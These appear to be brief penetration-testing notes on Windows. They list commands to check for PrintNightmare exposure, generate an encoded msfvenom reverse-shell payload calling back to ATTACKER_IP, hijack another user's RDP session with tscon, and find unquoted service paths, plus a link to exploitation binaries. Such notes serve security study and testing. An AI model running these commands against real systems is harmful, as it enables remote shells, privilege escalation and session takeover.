# Windows
To check if remote machine is vulnerable to print-nightmare

```text-plain
rpcdump.py @10.10.10.10 | egrep 'MS-RPRN|MS-PAR'
```

`C:\$Recycle.bin\<SID>`, where SID is for individual users.

powershell wrapped windows exploitation binaries resource: [https://github.com/S3cur3Th1sSh1t/PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) 

To use encoders with metasploit, use:

```text-plain
msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

To get details about a running service:

```text-plain
Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" |
select-object *
```

to switch an rdp session when you have administrator privileges, use:

```text-plain
tscon 3 /dest:rdp-tcp#6 
```

where 3 is the id of the target session and 6 is your current session id.

To find unquoted service path vulns, use:

```text-plain
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v
"c:\windows\\" |findstr /i /v """
```